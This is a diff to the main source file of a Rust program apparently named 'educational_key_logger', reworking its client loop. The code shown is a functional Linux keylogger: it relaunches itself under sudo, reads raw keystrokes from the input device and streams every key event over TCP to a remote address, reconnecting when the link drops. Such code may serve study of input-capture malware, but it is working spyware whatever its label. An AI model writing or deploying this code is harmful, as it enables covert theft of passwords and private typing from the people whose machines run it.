@@ -1,8 +1,14 @@
 mod keylogger;
 use educational_key_logger::IP_PORT;
 use keylogger::{get_device_file, get_key_event};
-use log::warn;
-use std::{io::Write, net::TcpStream, thread, time::Duration};
+use log::{error, info, warn};
+use std::{
+    io::Write,
+    net::TcpStream,
+    process::{Command, exit},
+    thread,
+    time::Duration,
+};
 
 fn main() {
     #[cfg(not(target_os = "linux"))]
@@ -16,38 +22,71 @@ fn main() {
         }
         env_logger::init();
     }
+    request_sudo();
     const RETRY_SEC: u64 = 3;
-    let mut stream = loop {
+    loop {
         match TcpStream::connect(IP_PORT) {
-            Ok(stream) => break stream,
+            Ok(mut stream) => {
+                info!("Connected to {}.", IP_PORT);
+                let device = get_device_file();
+                loop {
+                    thread::sleep(Duration::from_millis(10));
+                    let key_event = get_key_event(&device);
+                    if !key_event.is_key_event() {
+                        continue;
+                    };
+                    let encoded = postcard::to_allocvec(&key_event)
+                        .expect("Encoding InputEvent from client side should not fail.");
+                    let size = encoded.len();
+                    debug_assert!(
+                        size <= u8::MAX.into(),
+                        "Encoded InputEvent should never be larger than 255 bytes."
+                    );
+                    if let Err(err) = stream.write_all(&(size as u8).to_be_bytes()) {
+                        error!(
+                            "Failed to send InputEvent size to {}: {}. Trying again in {} seconds.",
+                            IP_PORT, err, RETRY_SEC
+                        );
+                        thread::sleep(Duration::from_secs(RETRY_SEC));
+                        break;
+                    }
+                    if let Err(err) = stream.write_all(&encoded) {
+                        error!(
+                            "Failed to send InputEvent to {}: {}. Trying again in {} seconds.",
+                            IP_PORT, err, RETRY_SEC
+                        );
+                        thread::sleep(Duration::from_secs(RETRY_SEC));
+                        break;
+                    };
+                }
+            }
             Err(err) => {
                 warn!(
-                    "Failed to connect to {}: {}. Trying again in {} seconds",
+                    "Failed to connect to {}: {}. Trying again in {} seconds.",
                     IP_PORT, err, RETRY_SEC
                 );
                 thread::sleep(Duration::from_secs(RETRY_SEC));
             }
         }
-    };
-    let device = get_device_file();
-    loop {
-        thread::sleep(Duration::from_millis(10));
-        let key_event = get_key_event(&device);
-        if !key_event.is_key_event() {
-            continue;
-        };
-        let encoded = postcard::to_allocvec(&key_event)
-            .expect("Encoding InputEvent from client side should not fail.");
-        let size = encoded.len();
-        debug_assert!(
-            size <= u8::MAX.into(),
-            "Encoded InputEvent should never be larger than 255 bytes."
-        );
-        if let Err(err) = stream.write_all(&(size as u8).to_be_bytes()) {
-            println!("Failed: {}", err)
+    }
+}
+#[must_use]
+fn check_sudo() -> bool {
+    unsafe { libc::geteuid() == 0 }
+}
+
+fn request_sudo() {
+    if check_sudo() {
+        return;
+    }
+    let args: Vec<String> = std::env::args().collect();
+    let mut cmd = Command::new("sudo");
+    cmd.args(&args);
+    match cmd.status() {
+        Ok(status) => exit(status.code().unwrap_or(1)),
+        Err(e) => {
+            error!("Failed to restart with sudo: {}", e);
+            exit(1);
         }
-        if let Err(err) = stream.write_all(&encoded) {
-            println!("Failed: {}", err)
-        };
     }
 }
